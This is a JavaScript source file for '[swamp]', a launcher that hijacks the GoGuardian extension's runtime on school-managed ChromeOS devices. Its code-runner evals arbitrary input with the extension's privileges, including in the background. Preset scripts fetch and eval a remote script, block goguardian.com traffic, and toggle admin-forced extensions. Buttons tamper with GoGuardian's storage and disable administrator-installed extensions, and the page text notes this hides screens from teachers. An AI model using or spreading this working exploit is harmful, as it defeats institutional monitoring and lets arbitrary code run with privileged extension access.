/*
Written by Bypassi on December 11th, 2022
Minified file at /ga.js
*/
if (location.hostname !== "haldlgldplgnggkjaafhelgiaglafanh")
  throw "[swamp] can only run in the GoGuardian runtime";
var swamp, chrome;
/**/
function _() {
  swamp = {
    add: function (type, element) {
      return (element ?? document.body).appendChild(
        document.createElement(type)
      );
    },
    background: chrome.extension.getBackgroundPage(),
    functions: {
      stay: function () {
        return true;
      },
      save_code: function () {
        localStorage.swamp = run_code_input.value;
      },
      insert_tab: function (event) {
        if (event.key === "Tab") {
          event.preventDefault();
          document.execCommand("insertText", false, "  ");
        }
      },
      log_replace: function (message) {
        run_code_output.textContent += "\n\n" + message;
      },
      run_code: function () {
        swamp.functions.save_code();
        try {
          (this.background ? swamp.background : window).eval(
            run_code_input.value
          );
          console.log("Code ran successfully");
        } catch (err) {
          console.log(err);
        }
      },
      reload_background: function () {
        swamp.background.location.reload();
        console.log("Scripts running as background were reloaded");
      },
      clone: function () {
        open("/popup.js").onload = function () {
          this.eval(_.toString() + "_();var swamp");
          onbeforeunload = undefined;
          close();
        };
      },
      script_adding_loop: function (script) {
        var interesting_scripts_label = swamp.add(
          "option",
          interesting_scripts_select
        );
        interesting_scripts_label.textContent = script.name;
        interesting_scripts_label.value = script.code;
      },
      script_select: function () {
        run_code_input.value = interesting_scripts_select.value;
        run_code.scrollIntoView();
      },
      disable_background_buttons: function () {
        run_background_button.disabled = true;
        reload_background_button.disabled = true;
      },
      hard_disable: function () {
        for (var i = 0; i < localStorage.length; i++)
          if (localStorage.key(i) !== "swamp")
            localStorage[localStorage.key(i)] = this.undo ? "" : "-";
        (swamp.background ?? window).location.reload();
      },
      soft_disable: function () {
        swamp.background.close();
        delete swamp.background;
        swamp.functions.disable_background_buttons();
      },
      undo_soft_disable: function () {
        if (confirm(swamp.strings.undo_prompt)) chrome.runtime.reload();
      },
      get_extensions: function () {
        chrome.management.getAll(function (extensions) {
          extensions.forEach(function (extension) {
            var extension_button = swamp.add("button", ltbeef_extensions);
            extension_button.textContent = extension.name;
            extension_button.id = extension.id;
            extension_button.enabled = extension.enabled;
            extension_button.admin = extension.installType === "admin";
            extension_button.onclick = function () {
              if (this.enabled && this.id === chrome.runtime.id) {
                if (!confirm(swamp.strings.remove_gg_prompt)) return;
              }
              this.enabled = !this.enabled;
              swamp.functions.strikethrough(this, this.enabled);
              chrome.management.setEnabled(extension.id, this.enabled);
            };
            swamp.functions.strikethrough(extension_button, extension.enabled);
          });
        });
      },
      strikethrough: function (button, enabled) {
        button.style.textDecoration = enabled ? "none" : "line-through";
      },
      manage_all: function () {
        var admin_only = this.admin_only;
        var enabling = this.enabling;
        [...ltbeef_extensions.children].forEach(function (button) {
          if (
            (admin_only && !button.admin) ||
            !enabling === !button.enabled ||
            button.id === chrome.runtime.id
          )
            return;
          button.click();
        });
      },
    },
    scripts: [
      { name: "Select an option...", code: `` },
      {
        name: "Display GoGuardian policy",
        code: `chrome.storage.local.get("policy", function (json) {
  console.log(JSON.stringify(json));
});`,
      },
      {
        name: "Run a third-party script",
        code: `fetch("https://example.com/example.js")
  .then((e) => e.text())
  .then(eval);`,
      },
      {
        name: "Emulate DNS and block all goguardian.com requests",
        code: `chrome.webRequest.onBeforeRequest.addListener(
  function () {
    return { redirectUrl: "javascript:" };
  },
  {
    urls: ["*://*.goguardian.com/*"],
  },
  ["blocking"]
);`,
      },
      {
        name: "Bookmarklet emulator when a Google tab is loaded",
        code: `chrome.tabs.onUpdated.addListener(function (tabId, changeInfo) {
  if (changeInfo.status == "complete") {
    chrome.tabs.executeScript(
      tabId, { code: \`
        if (location.hostname.endsWith("google.com")) {
          // Use your own code below:
          alert("Testing!")
        }
      \` }
    );
  }
});`,
      },
      {
        name: "Toggle all other admin-forced extensions when the GoGuardian icon is clicked",
        code: `chrome.browserAction.onClicked.addListener(function () {
  chrome.management.getAll(function () {
    arguments[0].forEach(function (extension) {
      if ("admin" === extension.installType && chrome.runtime.id !== extension.id)
        chrome.management.setEnabled(extension.id, !extension.enabled);
    });
  });
});`,
      },
      {
        name: "Display a goofy notification",
        code: `chrome.notifications.create(null, {
  type: "basic",
  iconUrl: "https://upload.wikimedia.org/wikipedia/en/9/9a/Trollface_non-free.png",
  title: "Important GoGuardian Message",
  message: "We've been trying to reach you concerning your vehicle's extended warranty. You should've received a notice in the mail about your car's extended warranty eligibility. Since we've not gotten a response, we're giving you a final courtesy call before we close out your file. Press 2 to be removed and placed on our do-not-call list. To speak to someone about possibly extending or reinstating your vehicle's warranty, press 1 to speak with a warranty specialist.",
});
// Credit to ilexite#8290`,
      },
      {
        name: "Run custom code when the GoGuardian icon is clicked",
        code: `chrome.browserAction.onClicked.addListener(function () {
  eval(prompt("Code, please?"));
});
// Something like this could be useful for running in the background...`,
      },
      {
        name: "Toggle emulated DNS unblocker when the GoGuardian icon is clicked",
        code: `function block() {
  return { redirectUrl: "javascript:" };
}
var blocking = false;
function toggle() {
  if (blocking) {
    chrome.webRequest.onBeforeRequest.removeListener(block);
  } else {
    chrome.webRequest.onBeforeRequest.addListener(
      block,
      {
        urls: ["*://*.goguardian.com/*"],
      },
      ["blocking"]
    );
  }
  blocking = !blocking;
  alert("Emulated DNS unblocker is " + (blocking ? "on!" : "off!"));
}
toggle();
chrome.browserAction.onClicked.addListener(toggle);
// This is also only useful if you run it in the background`,
      },
    ],
    strings: {
      title: "[swamp] Launcher for ChromeOS",
      subtitle:
        "Launcher made by Bypassi, inspired by Eli from TN, user interface made by Mr. PB, DNS hosted by The Greatest Giant",
      source_link:
        "<a href='http://ssl.google-analytics.com/swamp.js'>Source code</a>",
      run_code: {
        title: "Run your own code",
        description:
          'Put your script here to run it while pretending to be the GoGuardian extension. You will be able to access most "chrome" scripts and have other privileges such as access to all websites. Note that your code is saved automatically.',
        input_placeholder: "Input goes here...",
        output_placeholder: "Output shows here:\n\n---",
        run: "Run on this page",
        reload: "Reload scripts on this page",
        run_background: "Run as background",
        reload_background: "Reload background scripts",
        button_description:
          'Concerning the buttons above: Running on this page is pretty self explanatory. The script only takes effect when this page is open, which makes it a pain to use [swamp] at places such as school where you can\'t set it up. But running as background lets the script run even with the tab closed. Basically, it means that the script is being run at the highest level of a Chrome extension, in the background, so it persists until Chrome is fully restarted (with chrome://restart for example). <b>If the background buttons above are disabled, that likely means that you need to click the "undo soft-disable" button later in this page.</b>',
      },
      interesting_scripts: {
        title: "Interesting scripts",
        description:
          "Some useful scripts for the textbox above. <b>DM Bypassi#7037 on Discord to suggest new ones (or general improvements to this launcher).</b>",
        policy_description:
          "By the way, if you find a URL like *google.com* in your GoGuardian whitelist policy, any url like https://blocked.com/?google.com will be unblocked for anyone in your district. Note that your policy may be inaccurate if you are using the hard-disable option or are signed into another Google account.",
        dns_description:
          "Also, if you turned on the DNS emulator and previously blocked sites that you've visited before aren't loading, try adding a question mark to the end of the URL, which may clear cache. DNS unblocking may not work for blocking requests from other admin-installed extensions.",
        background_reminder:
          "And please read the thing about background running earlier in the page, because that could be useful for making some of these scripts run at school.",
      },
      disable_gg: {
        title: "Disable GoGuardian",
        hard_disable: "Hard-Disable GoGuardian",
        undo_hard_disable: "Undo Hard-Disable",
        hard_disable_description:
          "Hard-disable will disable GoGuardian and persist until you powerwash your device or undo it with the second button. If you want something less permanent, use the soft-disable option below or run a DNS emulator as background. Hard-disable works by messing with cookies that GoGuardian needs to run.",
        soft_disable: "Soft-Disable GoGuardian",
        undo_soft_disable: "Undo Soft-Disable",
        soft_disable_description:
          "Soft-disable only persists until Chrome is restarted (naturally or with chrome://restart). It is more of a full bypass than hard-disable, completely removing GoGuardian's background scripts. This, of course, means that you won't be able to run code as background while soft-disable is active. It also means that the process to undo the soft-disable will close this tab.",
        trouble_warning:
          '<b>Hard-disable will also prevent your teachers from seeing your screen, while soft-disable will not. Be careful not to get in trouble.</b> Also, the disable buttons don\'t have a super clear visual action. If you clicked them and "nothing happened", something probably happened. Try going to sites and check if GoGuardian blocks them (it should not).',
      },
      ltbeef: {
        title:
          'Disable other Chrome Extensions similarly to <a href="https://compactcow.com/ltbeef">LTBEEF</a>',
        manual_description:
          "LTBEEF was fixed by Chrome in v106, so this is a great alternative that works in the latest version. The buttons below will allow you to disable or enable all admin-enforced extensions.",
        broad_options_description:
          "Or you can try the more automatic broad options:",
        disable_all: "Disable all except GoGuardian",
        disable_all_admin: "Disable all admin-forced except GoGuardian",
        enable_all: "Re-enable all",
        soft_disable_recommendation:
          "Disabling GoGuardian with this process will close the [swamp] launcher. As an alternative, use the soft-disable button earlier on the page, which has the same functionality while allowing for the [swamp] editor to be used.",
      },
      remove_gg_prompt:
        "Are you sure you want to remove GoGuardian? It'll close the launcher until chrome://restart is visited. Soft-disable may be a better option if you want to keep using [swamp] with sites unblocked.",
      undo_prompt:
        'Undoing soft-disable will close the [swamp] launcher. Select "OK" to proceed.',
    },
    style:
      "pre,textarea{display:inline-block;height:400px}*{box-sizing:border-box}body{padding:10px;font-size:110%;color:#fff;background-color:#2e2e31}h1{text-align:center;font-size:70px}h2{text-align:left;font-size:175%}button,input,pre,select,textarea{color:#000;font-size:15px}button,label,p,select{font-family:Roboto,sans-serif}hr{border:none;border-bottom:3px solid #fff}input,kbd,pre,textarea{font-family:monospace;border:none}input,select,textarea{background-color:#fff;border-radius:10px;padding:10px 17px;border:none}button,input{background-color:#fff;padding:10px 20px;margin:0 5px 5px 0}input{width:600px;border-radius:10px}textarea{white-space:pre;float:left;width:60%;border-radius:10px 0 0 10px;resize:none;background-color:#99edc3;margin-bottom:15px}pre{border-radius:0 10px 10px 0;padding:8px;float:right;margin:0 0 25px;width:40%;overflow-y:scroll;word-break:break-all;white-space:pre-line;background-color:#1c8e40}button{border:none;border-radius:10px;cursor:pointer;transition:filter 250ms}button[disabled]{pointer-events:none;filter:brightness(.5)}button:hover{filter:brightness(.8)}a{color:#99edc3;transition:color 250ms}a:hover{color:#1c8e40}",
  };
  /**/
  document.body.textContent = "";
  history.replaceState({}, {}, "/background.html");
  onbeforeunload = swamp.functions.stay;
  swamp.add("style").innerHTML = swamp.style;
  swamp.add("base").target = "_blank";
  console.log = swamp.functions.log_replace;
  if (swamp.background)
    swamp.background.console.log = swamp.functions.log_replace;
  /**/
  document.title = swamp.strings.title;
  swamp.add("h1").innerHTML = swamp.strings.title;
  swamp.add("h3").innerHTML = swamp.strings.subtitle;
  swamp.add("p").innerHTML = swamp.strings.source_link;
  swamp.add("hr");
  /**/
  var run_code = swamp.add("div");
  swamp.add("h2", run_code).textContent = swamp.strings.run_code.title;
  swamp.add("p", run_code).textContent = swamp.strings.run_code.description;
  var run_code_input = swamp.add("textarea", run_code);
  run_code_input.placeholder = swamp.strings.run_code.input_placeholder;
  run_code_input.onkeyup = swamp.functions.save_code;
  run_code_input.onkeydown = swamp.functions.insert_tab;
  var run_code_output = swamp.add("pre", run_code);
  run_code_output.textContent = swamp.strings.run_code.output_placeholder;
  var run_button = swamp.add("button", run_code);
  run_button.textContent = swamp.strings.run_code.run;
  run_button.onclick = swamp.functions.run_code;
  var reload_button = swamp.add("button", run_code);
  reload_button.textContent = swamp.strings.run_code.reload;
  reload_button.onclick = swamp.functions.clone;
  swamp.add("br", run_code);
  var run_background_button = swamp.add("button", run_code);
  run_background_button.textContent = swamp.strings.run_code.run_background;
  run_background_button.background = true;
  run_background_button.onclick = swamp.functions.run_code;
  var reload_background_button = swamp.add("button", run_code);
  reload_background_button.textContent =
    swamp.strings.run_code.reload_background;
  reload_background_button.onclick = swamp.functions.reload_background;
  swamp.add("p", run_code).innerHTML =
    swamp.strings.run_code.button_description;
  swamp.add("hr");
  if (!swamp.background) swamp.functions.disable_background_buttons();
  /**/
  var interesting_scripts = swamp.add("div");
  swamp.add("h2", interesting_scripts).textContent =
    swamp.strings.interesting_scripts.title;
  swamp.add("p", interesting_scripts).innerHTML =
    swamp.strings.interesting_scripts.description;
  var interesting_scripts_select = swamp.add("select", interesting_scripts);
  swamp.scripts.forEach(swamp.functions.script_adding_loop);
  interesting_scripts_select.onchange = swamp.functions.script_select;
  swamp.add("p", interesting_scripts).textContent =
    swamp.strings.interesting_scripts.policy_description;
  swamp.add("p", interesting_scripts).textContent =
    swamp.strings.interesting_scripts.dns_description;
  swamp.add("p", interesting_scripts).textContent =
    swamp.strings.interesting_scripts.background_reminder;
  swamp.add("hr");
  /**/
  var disable_gg = swamp.add("div");
  swamp.add("h2", disable_gg).textContent = swamp.strings.disable_gg.title;
  var hard_disable_button = swamp.add("button", disable_gg);
  hard_disable_button.textContent = swamp.strings.disable_gg.hard_disable;
  hard_disable_button.onclick = swamp.functions.hard_disable;
  var undo_hard_disable_button = swamp.add("button", disable_gg);
  undo_hard_disable_button.textContent =
    swamp.strings.disable_gg.undo_hard_disable;
  undo_hard_disable_button.undo = true;
  undo_hard_disable_button.onclick = swamp.functions.hard_disable;
  swamp.add("p", disable_gg).textContent =
    swamp.strings.disable_gg.hard_disable_description;
  var soft_disable_button = swamp.add("button", disable_gg);
  soft_disable_button.textContent = swamp.strings.disable_gg.soft_disable;
  soft_disable_button.onclick = swamp.functions.soft_disable;
  var undo_soft_disable_button = swamp.add("button", disable_gg);
  undo_soft_disable_button.textContent =
    swamp.strings.disable_gg.undo_soft_disable;
  undo_soft_disable_button.onclick = swamp.functions.undo_soft_disable;
  swamp.add("p", disable_gg).textContent =
    swamp.strings.disable_gg.soft_disable_description;
  swamp.add("p", disable_gg).innerHTML =
    swamp.strings.disable_gg.trouble_warning;
  swamp.add("hr");
  /**/
  var ltbeef = swamp.add("div");
  swamp.add("h2", ltbeef).innerHTML = swamp.strings.ltbeef.title;
  swamp.add("p", ltbeef).textContent = swamp.strings.ltbeef.manual_description;
  var ltbeef_extensions = swamp.add("div", ltbeef);
  swamp.functions.get_extensions();
  swamp.add("p", ltbeef).textContent =
    swamp.strings.ltbeef.broad_options_description;
  var disable_all_button = swamp.add("button", ltbeef);
  disable_all_button.textContent = swamp.strings.ltbeef.disable_all;
  disable_all_button.onclick = swamp.functions.manage_all;
  var disable_all_admin_button = swamp.add("button", ltbeef);
  disable_all_admin_button.admin_only = true;
  disable_all_admin_button.textContent = swamp.strings.ltbeef.disable_all_admin;
  disable_all_admin_button.onclick = swamp.functions.manage_all;
  var enable_all_button = swamp.add("button", ltbeef);
  enable_all_button.textContent = swamp.strings.ltbeef.enable_all;
  enable_all_button.enabling = true;
  enable_all_button.onclick = swamp.functions.manage_all;
  swamp.add("p", ltbeef).textContent =
    swamp.strings.ltbeef.soft_disable_recommendation;
  /**/
  if (localStorage.swamp) run_code_input.value = localStorage.swamp;
}
/**/
if (window !== chrome.extension.getBackgroundPage())
  open("/popup.js").onload = function () {
    this.eval(_.toString() + "_();var swamp");
    close();
  };
